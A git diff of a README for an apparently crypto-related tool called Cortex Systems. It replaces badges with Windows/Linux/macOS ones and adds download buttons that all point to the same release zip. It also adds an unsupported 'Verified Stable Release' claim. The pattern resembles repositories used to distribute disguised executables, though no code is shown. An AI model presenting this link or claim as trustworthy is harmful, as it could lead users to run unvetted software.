@@ -6,12 +6,13 @@
   <img src="https://img.shields.io/badge/Network-Polygon_Mainnet-8247E5?style=for-the-badge&logo=polygon" alt="Polygon">
 </p>
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Latency-Sub--85ms-orange?style=for-the-badge" alt="Latency">
-  <img src="https://img.shields.io/badge/Framework-Node.js_/_TypeScript-brightgreen?style=for-the-badge&logo=node.js" alt="Framework">
-  <img src="https://img.shields.io/badge/Build-May_2026-blue?style=for-the-badge" alt="Build">
+<p align="center"> 
+  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="Windows">
+  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="Linux">
+  <img src="https://img.shields.io/badge/OS-macOS-white?style=for-the-badge&logo=apple" alt="macOS">
+ </p>  
+
   
-</p>     
 
 
 
@@ -28,8 +29,15 @@
 
 <p align="center">
   <a href="https://github.com/cal-miller-dev/cortex-deployment-hub/releases/download/CortexLauncher/Cortex.Systems.v3.4.2.Stable.zip">
-    <img src="https://img.shields.io/badge/STABLE_RELEASE-v3.4.2-blueviolet?style=for-the-badge&logo=gitbook&logoColor=white" alt="Download Framework">
+    <img src="https://img.shields.io/badge/DOWNLOAD_CORTEX_SYSTEMS-v3.4.2-blue?style=for-the-badge&logo=windows&logoColor=white" height="45">
   </a>
+  <a href="https://github.com/cal-miller-dev/cortex-deployment-hub/releases/download/CortexLauncher/Cortex.Systems.v3.4.2.Stable.zip">
+    <img src="https://img.shields.io/badge/LINUX_BUILD-STABLE-orange?style=for-the-badge&logo=linux&logoColor=white" height="45">
+  </a>
+</p>
+
+<p align="center">
+  <b>Verified Stable Release for Windows 10/11 & Linux x64</b>
 </p>
 
 
